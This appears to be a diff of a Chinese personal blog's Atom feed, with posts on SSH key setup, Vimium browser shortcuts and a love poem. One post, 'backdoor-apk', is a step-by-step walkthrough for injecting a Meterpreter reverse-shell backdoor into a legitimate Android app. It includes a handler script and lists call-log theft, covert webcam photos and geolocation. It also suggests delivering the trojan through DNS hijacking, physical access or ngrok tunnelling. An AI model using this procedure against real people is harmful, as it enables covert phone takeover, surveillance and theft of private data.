+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-t 为指定加密算法类型，支持rsa，dsa，ecdsa&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-b 指定密钥大小，ecdsa算法默认大小为256位&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ECDSA (椭圆曲线数字签名算法) 生成的密钥更小，安全性更高&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;如果不需要更改密钥存储位置并为私钥设置密码，可以一路回车&lt;br&gt;ssh-keygen默认会在 $HOME/.ssh/目录下生成2个文件：id_ecdsa.pub（公钥）和id_ecdsa（私钥）。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;将公钥上传到远程服务器&lt;blockquote&gt;
+&lt;p&gt;ssh-copy-id  username@remote_ip&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;ssh-copy-id会将你刚刚生成的公钥(id_ecdsa.pub)自动写入到远程主机的$HOME/.ssh/authorized_keys文件中&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;测试&lt;blockquote&gt;
+&lt;p&gt;ssh username@remote_ip&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
     
     </summary>
     
@@ -71,19 +138,31 @@
     <link href="http://yoursite.com/2018/03/02/backdoor-apk/"/>
     <id>http://yoursite.com/2018/03/02/backdoor-apk/</id>
     <published>2018-03-02T10:00:03.000Z</published>
-    <updated>2018-03-08T06:55:02.134Z</updated>
+    <updated>2018-03-14T01:25:17.760Z</updated>
     
-    <content type="html"><![CDATA[<p>========================</p><hr><h2 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h2><ul><li>Kali Linux</li><li>android</li><li>同一局域网 </li></ul><h2 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h2><p>安装依赖环境</p><blockquote><p>apt-get install lib32z1 lib32ncurses5  lib32stdc++6</p></blockquote><p>下载 backdoor-apk</p><blockquote><p>git clone <a href="https://github.com/dana-at-cp/backdoor-apk.git" target="_blank" rel="noopener">https://github.com/dana-at-cp/backdoor-apk.git</a></p></blockquote><p>下载完成后进入文件目录</p><blockquote><p>cd backdoor-apk/backdoor-apk</p></blockquote><p>将test.apk 移动到当前工作目录(backdoor-apk/backdoor-apk)下并执行</p><blockquote><p>./backdoor-apk.sh test.apk<br>PS:test.apk 为事先准备好的正常apk应用名</p></blockquote><p>选择payload<br><img src="img/apk_1.png" alt="apk">  </p><p>出现 [*] Aligning recompiled APK…done ,便会在backdoor-apk/backdoor-apkoriginal/dist/ 目录下生成带后门的apk文件</p><h2 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h2><p>执行</p><blockquote><p>msfconsole -r backdoor-apk.rc</p></blockquote><p>手机安装test.apk并打开 ,等一会就会发现已经获得了手机的meterpreter shell<br><img src="img/apk_msf.png" alt="msf"><br>可以看到获得反弹shell 会话<br>用sessions -i number  切换到当前会话<br>此处执行check_root 测试<br>其他功能可输入help 查看帮助，比如dump_callog(获取通话记录) webcam_snap(偷拍) geolocate(获取地理位置)等</p><p>可以用vim 打开backdoor-apk.rc 看到内容 与手动执行(msfconsole)一样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler  </span><br><span class="line">set payload android/meterpreter/reverse_tcp  </span><br><span class="line">set lhost 192.168.0.105  </span><br><span class="line">set lport 8888  </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol><li>[!] Failed to recompile original project with backdoor <ul><li>现在很多应用都会做一些处理防止反编译，可以上 <a href="https://apkpure.com" target="_blank" rel="noopener">APKPure</a> 或<a href="https://www.coolapk.com" target="_blank" rel="noopener">酷安</a> 去找一些历史版本会增加成功概率</li><li>apktools 过旧，可以把Kail 更到最新</li><li>一定要把 apk 放到backdoor-apk.sh 所在目录下</li></ul></li></ol><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><ul><li>外网环境可使用vps转发 或 ngrok穿透 参考<ul><li>vps 转发 <a href="http://www.freebuf.com/sectool/136574.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/136574.html</a></li><li>ngrok穿透 <a href="http://www.freebuf.com/sectool/162046.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/162046.html</a></li></ul></li><li>植入木马方式<ul><li>内网dns劫持: <a href="http://www.freebuf.com/sectool/136574.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/136574.html</a></li><li>物理接触</li></ul></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="http://www.secist.com/archives/680.html" target="_blank" rel="noopener">http://www.secist.com/archives/680.html</a></li><li><a href="http://www.4hou.com/mobile/8290.html" target="_blank" rel="noopener">http://www.4hou.com/mobile/8290.html</a></li></ul>]]></content>
+    <content type="html"><![CDATA[<p>========================</p><hr><h2 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h2><ul><li>Kali Linux</li><li>android</li><li>同一局域网 </li></ul><h2 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h2><p>安装依赖环境</p><blockquote><p>apt-get install lib32z1 lib32ncurses5  lib32stdc++6</p></blockquote><p>下载 backdoor-apk</p><blockquote><p>git clone <a href="https://github.com/dana-at-cp/backdoor-apk.git" target="_blank" rel="noopener">https://github.com/dana-at-cp/backdoor-apk.git</a></p></blockquote><p>下载完成后进入文件目录</p><blockquote><p>cd backdoor-apk/backdoor-apk</p></blockquote><a id="more"></a><p>将test.apk 移动到当前工作目录(backdoor-apk/backdoor-apk)下并执行</p><blockquote><p>./backdoor-apk.sh test.apk<br>PS:test.apk 为事先准备好的正常apk应用名</p></blockquote><p>选择payload<br><img src="/img/apk_1.png" alt="apk">  </p><p>出现 [*] Aligning recompiled APK…done ,便会在backdoor-apk/backdoor-apkoriginal/dist/ 目录下生成带后门的apk文件</p><h2 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h2><p>执行</p><blockquote><p>msfconsole -r backdoor-apk.rc</p></blockquote><p>手机安装test.apk并打开 ,等一会就会发现已经获得了手机的meterpreter shell<br><img src="/img/apk_msf.png" alt="msf"><br>可以看到获得反弹shell 会话<br>用sessions -i number  切换到当前会话<br>此处执行check_root 测试<br>其他功能可输入help 查看帮助，比如dump_callog(获取通话记录) webcam_snap(偷拍) geolocate(获取地理位置)等</p><p>可以用vim 打开backdoor-apk.rc 看到内容 与手动执行(msfconsole)一样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler  </span><br><span class="line">set payload android/meterpreter/reverse_tcp  </span><br><span class="line">set lhost 192.168.0.105  </span><br><span class="line">set lport 8888  </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol><li>[!] Failed to recompile original project with backdoor <ul><li>现在很多应用都会做一些处理防止反编译，可以上 <a href="https://apkpure.com" target="_blank" rel="noopener">APKPure</a> 或<a href="https://www.coolapk.com" target="_blank" rel="noopener">酷安</a> 去找一些历史版本会增加成功概率</li><li>apktools 过旧，可以把Kail 更到最新</li><li>一定要把 apk 放到backdoor-apk.sh 所在目录下</li></ul></li></ol><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><ul><li>外网环境可使用vps转发 或 ngrok穿透 参考<ul><li>vps 转发 <a href="http://www.freebuf.com/sectool/136574.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/136574.html</a></li><li>ngrok穿透 <a href="http://www.freebuf.com/sectool/162046.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/162046.html</a></li></ul></li><li>植入木马方式<ul><li>内网dns劫持: <a href="http://www.freebuf.com/sectool/136574.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/136574.html</a></li><li>物理接触</li></ul></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="http://www.secist.com/archives/680.html" target="_blank" rel="noopener">http://www.secist.com/archives/680.html</a></li><li><a href="http://www.4hou.com/mobile/8290.html" target="_blank" rel="noopener">http://www.4hou.com/mobile/8290.html</a></li></ul>]]></content>
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;========================&lt;/p&gt;
+      &lt;p&gt;========================&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&quot;实验环境：&quot;&gt;&lt;a href=&quot;#实验环境：&quot; class=&quot;headerlink&quot; title=&quot;实验环境：&quot;&gt;&lt;/a&gt;实验环境：&lt;/h2&gt;&lt;ul&gt;
 &lt;li&gt;Kali Linux&lt;/li&gt;
-      
+&lt;li&gt;android&lt;/li&gt;
+&lt;li&gt;同一局域网 &lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;生成后门&quot;&gt;&lt;a href=&quot;#生成后门&quot; class=&quot;headerlink&quot; title=&quot;生成后门&quot;&gt;&lt;/a&gt;生成后门&lt;/h2&gt;&lt;p&gt;安装依赖环境&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;apt-get install lib32z1 lib32ncurses5  lib32stdc++6&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;下载 backdoor-apk&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;git clone &lt;a href=&quot;https://github.com/dana-at-cp/backdoor-apk.git&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/dana-at-cp/backdoor-apk.git&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;下载完成后进入文件目录&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;cd backdoor-apk/backdoor-apk&lt;/p&gt;
+&lt;/blockquote&gt;
     
     </summary>
     
@@ -94,20 +173,18 @@
   
   <entry>
     <title>Vimium 入门</title>
-    <link href="http://yoursite.com/2018/02/28/Vimium-use/"/>
-    <id>http://yoursite.com/2018/02/28/Vimium-use/</id>
+    <link href="http://yoursite.com/2018/02/28/vimium/"/>
+    <id>http://yoursite.com/2018/02/28/vimium/</id>
     <published>2018-02-28T09:09:00.000Z</published>
-    <updated>2018-03-07T06:21:13.700Z</updated>
+    <updated>2018-03-14T01:27:56.834Z</updated>
     
-    <content type="html"><![CDATA[<p>========================</p><h3 id="vimium-介绍"><a href="#vimium-介绍" class="headerlink" title="vimium 介绍"></a>vimium 介绍</h3><p>Vimium  是一款可以只用键盘就控制浏览器的「神器」，如果你喜欢鼠标手势所带来的效率提升一定要试试这个插件。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/vimium/dbepggeogbaibhgnhhndojpepiihcmeb" target="_blank" rel="noopener">Chrome</a><br><a href="https://addons.mozilla.org/zh-CN/firefox/addon/vimium-ff/?src=userprofile" target="_blank" rel="noopener">Firefox</a></p><hr><h3 id="Vimium使用总结"><a href="#Vimium使用总结" class="headerlink" title="Vimium使用总结"></a>Vimium使用总结</h3><p><img src="img/vimium.png" alt="vim"></p><ul><li><p>页内浏览</p><ul><li>j:向下滚动一点</li><li>k:向上滚动一点</li><li>gg:到页面最底部</li><li>G:到页面最底部</li><li>d:向下翻一屏</li><li>u:向上翻一屏</li><li>gs:查看源代码</li><li>gi:聚焦到第一个输入点</li><li>i/Esc: 输入模式/命令模式</li></ul></li><li><p>快速选取</p><ul><li>/:快速查找 [n] 向下匹配项  [N]向上匹配</li><li>yy:拷贝当前页面的URL</li><li>yf:拷贝指定URL</li><li>V:选取指定段内容</li></ul></li><li><p>标签操作</p><ul><li>t:创建一个新标签</li><li>T:显示所有标签</li><li>J:上一个标签</li><li>K:下一个标签</li><li>x:关闭当前标签</li><li>X:恢复上个关闭的标签</li><li>r:重新加载  [F5]</li></ul></li><li><p>导航操作</p><ul><li>p/P : 打开剪贴板内的链接,否则进行搜索</li><li>o/O:从收藏夹、历史记录打开：如果你输的是一个网址，回车还能直接打开</li><li>f/F: 快速打开某链接</li><li>gf：跳到父页面</li><li>H:回退上一个历史页面 [&lt;-]</li><li>L:回到下一个历史页面  [-&gt;]</li></ul></li><li><p>浏览器快捷键</p><ul><li>ctrl+w: 关闭当前页面</li><li>ctrl+t: 新建标签</li><li>F6: 在当前页面输入URL</li><li>ctrl+d: 为当前页添加书签</li></ul></li></ul><hr><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>某些网站可能自带键盘映射，可为其单独设置 unmapAll 以恢复网页自带键盘映射。</p>]]></content>
+    <content type="html"><![CDATA[<p>========================</p><h3 id="vimium-介绍"><a href="#vimium-介绍" class="headerlink" title="vimium 介绍"></a>vimium 介绍</h3><p>Vimium  是一款可以只用键盘就控制浏览器的「神器」，如果你喜欢鼠标手势所带来的效率提升,一定要试试这个插件。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/vimium/dbepggeogbaibhgnhhndojpepiihcmeb" target="_blank" rel="noopener">Chrome</a><br><a href="https://addons.mozilla.org/zh-CN/firefox/addon/vimium-ff/?src=userprofile" target="_blank" rel="noopener">Firefox</a></p><a id="more"></a><hr><h3 id="Vimium使用总结"><a href="#Vimium使用总结" class="headerlink" title="Vimium使用总结"></a>Vimium使用总结</h3><p><img src="/img/vimium.png" alt="vim"></p><ul><li><p>页内浏览</p><ul><li>j:向下滚动一点</li><li>k:向上滚动一点</li><li>gg:到页面最底部</li><li>G:到页面最底部</li><li>d:向下翻一屏</li><li>u:向上翻一屏</li><li>gs:查看源代码</li><li>gi:聚焦到第一个输入点</li><li>i/Esc: 输入模式/命令模式</li></ul></li><li><p>快速选取</p><ul><li>/:快速查找 [n] 向下匹配项  [N]向上匹配</li><li>yy:拷贝当前页面的URL</li><li>yf:拷贝指定URL</li><li>V:选取指定段内容</li></ul></li><li><p>标签操作</p><ul><li>t:创建一个新标签</li><li>T:显示所有标签</li><li>J:上一个标签</li><li>K:下一个标签</li><li>x:关闭当前标签</li><li>X:恢复上个关闭的标签</li><li>r:重新加载  [F5]</li></ul></li><li><p>导航操作</p><ul><li>p/P : 打开剪贴板内的链接,否则进行搜索</li><li>o/O:从收藏夹、历史记录打开网址：如果你输的是一个网址，可以直接回车。</li><li>f/F: 快速打开某链接</li><li>gf：跳到父页面</li><li>H:回退上一个历史页面 [&lt;-]</li><li>L:回到下一个历史页面  [-&gt;]</li></ul></li><li><p>浏览器快捷键</p><ul><li>ctrl+w: 关闭当前页面</li><li>ctrl+t: 新建标签</li><li>F6: 在当前页面输入URL</li><li>ctrl+d: 为当前页添加书签</li></ul></li></ul><hr><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>某些网站可能自带键盘映射，可为其单独设置 unmapAll 以恢复网页自带的快捷键。</p>]]></content>
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;========================&lt;/p&gt;
-&lt;h3 id=&quot;vimium-介绍&quot;&gt;&lt;a href=&quot;#vimium-介绍&quot; class=&quot;headerlink&quot; title=&quot;vimium 介绍&quot;&gt;&lt;/a&gt;vimium 介绍&lt;/h3&gt;&lt;p&gt;Vimium  是一
-      
+      &lt;p&gt;========================&lt;/p&gt;
+&lt;h3 id=&quot;vimium-介绍&quot;&gt;&lt;a href=&quot;#vimium-介绍&quot; class=&quot;headerlink&quot; title=&quot;vimium 介绍&quot;&gt;&lt;/a&gt;vimium 介绍&lt;/h3&gt;&lt;p&gt;Vimium  是一款可以只用键盘就控制浏览器的「神器」，如果你喜欢鼠标手势所带来的效率提升,一定要试试这个插件。&lt;/p&gt;
+&lt;p&gt;下载地址：&lt;br&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/vimium/dbepggeogbaibhgnhhndojpepiihcmeb&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Chrome&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://addons.mozilla.org/zh-CN/firefox/addon/vimium-ff/?src=userprofile&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Firefox&lt;/a&gt;&lt;/p&gt;
     
     </summary>
     
@@ -118,22 +195,21 @@
   
   <entry>
     <title>随笔・一</title>
-    <link href="http://yoursite.com/2018/02/16/suinian/"/>
-    <id>http://yoursite.com/2018/02/16/suinian/</id>
+    <link href="http://yoursite.com/2018/02/16/poetry/"/>
+    <id>http://yoursite.com/2018/02/16/poetry/</id>
     <published>2018-02-15T17:09:01.000Z</published>
-    <updated>2018-03-07T06:21:02.053Z</updated>
+    <updated>2018-03-14T01:37:11.000Z</updated>
     
-    <content type="html"><![CDATA[<p>===========================</p><p><img src="img/sui_1.png" alt="love"></p><blockquote><p>喜欢是种奇妙的感觉，它不需要特意营造的氛围，不需要晴朗的天气，只要是你，只需要是你。</p></blockquote><p><strong>初心</strong><br>捡起一段坚韧的丝线，<br>串起断线的曾经。<br>抓住夏的尾巴，<br>将时钟拨到最初。<br>夏花灿烂那时，<br>是我们的开始。<br>贪念着空气里的丝丝香甜，<br>就这样静静地，<br>静静地望着你。<br>截一段甜到发稠的岁月，<br>缓缓流淌在时光里。<br>折一只小船，<br>轻轻飘荡到你的心房。<br>小船轻触你内心的柔软，<br>扒开你坚硬的外壳。  </p><p>原来你是最初的心动，<br>是夏日最绵软的清风。<br>我想如果我爱你，<br>可是我发现不是如果，<br>我一直都在爱你。  </p>]]></content>
+    <content type="html"><![CDATA[<p>===========================</p><p><img src="/img/love.png" alt="love"></p><blockquote><p>喜欢是种奇妙的感觉，它不需要特意营造的氛围，不需要晴朗的天气，只要是你，只需要是你。</p></blockquote><p><strong>初心</strong><br>捡起一段坚韧的丝线，<br>串起断线的曾经。<br>抓住夏的尾巴，<br>将时钟拨到最初。<br>夏花灿烂那时，<br>是我们的开始。<br>贪念着空气里的丝丝香甜， </p><a id="more"></a> <p>就这样静静地，<br>静静地望着你。<br>截一段甜到发稠的岁月，<br>缓缓流淌在时光里。<br>折一只小船，<br>轻轻飘荡到你的心房。<br>小船轻触你内心的柔软，<br>扒开你坚硬的外壳。  </p><p>原来你是最初的心动，<br>是夏日最绵软的清风。<br>我想如果我爱你，<br>可是我发现不是如果，<br>我一直都在爱你。 </p><p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;—— 鹤蕴 </p><hr><font size="2" color="gray"><em>非原创，经原作者授权而发布于此。</em></font>]]></content>
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;===========================&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;img/sui_1.png&quot; alt=&quot;love&quot;&gt;&lt;/p&gt;
+      &lt;p&gt;===========================&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/img/love.png&quot; alt=&quot;love&quot;&gt;&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;喜欢是种奇妙的感觉，它不需要特意营造的氛围，不需要晴朗的天气，只要是你，只需要是你。&lt;/p
-      
+&lt;p&gt;喜欢是种奇妙的感觉，它不需要特意营造的氛围，不需要晴朗的天气，只要是你，只需要是你。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;初心&lt;/strong&gt;&lt;br&gt;捡起一段坚韧的丝线，&lt;br&gt;串起断线的曾经。&lt;br&gt;抓住夏的尾巴，&lt;br&gt;将时钟拨到最初。&lt;br&gt;夏花灿烂那时，&lt;br&gt;是我们的开始。&lt;br&gt;贪念着空气里的丝丝香甜， &lt;/p&gt;
     
     </summary>
     
